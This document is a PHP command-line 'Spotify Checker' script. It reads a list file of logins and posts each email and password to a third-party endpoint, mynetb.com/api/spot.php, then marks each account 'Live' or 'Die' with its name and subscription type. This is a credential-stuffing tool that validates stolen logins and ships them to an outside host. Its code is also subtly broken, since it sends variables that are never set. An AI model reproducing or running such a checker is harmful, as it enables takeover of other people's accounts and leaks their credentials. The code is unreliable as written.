<?php  
date_default_timezone_set('Asia/Jakarta');
error_reporting(0);
ini_set('display_errors', 0);
function microtime_float()
{
    list($usec, $sec) = explode(" ", microtime());
    return ((float)$usec + (float)$sec);
}

function curl ($url, $data) {
	$ch = curl_init();
	
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

	$headers = array();
	$headers[] = 'Accept-Encoding: gzip, deflate, br';
	$headers[] = 'Accept-Language: en-US,en;q=0.9';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 OPR/57.0.3098.106';
	$headers[] = 'Accept: application/json, text/plain, */*';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

	$result = curl_exec($ch);
	if (curl_errno($ch)) {
		echo 'Error:' . curl_error($ch);
	}
	curl_close ($ch);
	return $result;
}

echo "============================================\n";
echo "              Spotify Checker "; 
echo "\n============================================\n";
echo "Created by : \033[92mMr.Dzer0 \n\033[0mAPI From   : \033[95mKirnath Morscheck \033[0m\n";
echo "============================================\n";
echo "Nama File list : ";
$namafile = trim(fgets(STDIN));
$time_start = microtime_float();
$file = "$namafile.txt";
$ndata = array_sum(explode(' ', microtime()));
$baris = count(file($file));
$jumlah= 0;
$myfile = fopen("$namafile.txt", "r") or die("Unable to open file!");
while(! feof($myfile)){ 
$jumlah+=1;
$referrer= trim(fgets($myfile));
		$regis = curl("http://mynetb.com/api/spot.php", "email=$email&password=$password");
	    // echo $result = $regis;
		$bates = '/"[^"]*"/m';
		$time_end = microtime_float(); $time = $time_end - $time_start;  $nana = substr($time,0,3);		
		preg_match_all($bates, $regis, $matches, PREG_SET_ORDER, 0);
		$nil = $matches[1][0]; $nama = $matches[5][0]; $sub = $matches[7][0]; $erorr = $matches[3][0];
		if(preg_match("/success/i", $nil)){
			echo "[\033[92mLive\033[0m] $email | $password ( eror=$erorr , Nama=$nama , jenis=$sub ) \n";
		}
		else { 
		echo "[\033[91mDie\033[0m] $email | $password | ";
		}
		echo "$nana"."s\n";
	}
	echo "banyak data : $jumlah";

?>
